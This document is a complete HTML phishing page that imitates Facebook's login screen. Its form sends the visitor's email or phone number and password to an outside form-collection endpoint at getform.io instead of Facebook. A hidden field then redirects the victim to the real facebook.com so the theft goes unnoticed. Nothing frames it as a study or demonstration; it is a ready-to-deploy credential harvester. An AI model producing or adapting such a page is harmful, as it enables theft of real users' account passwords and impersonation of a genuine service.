<!DOCTYPE html>
<html>
<head>
    <title>Facebook - log in or sign up</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            border-radius: 8px;
            width: 360px;
        }
        .login-container h1 {
            color: #1877f2;
            text-align: center;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #165db4;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Facebook</h1>
        <form action="https://getform.io/f/ayvkvlob" method="POST">
            <input type="text" placeholder="Email or phone number" name="email" required>
            <input type="password" placeholder="Password" name="password" required>
            <input type="hidden" name="_next" value="https://www.facebook.com">
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
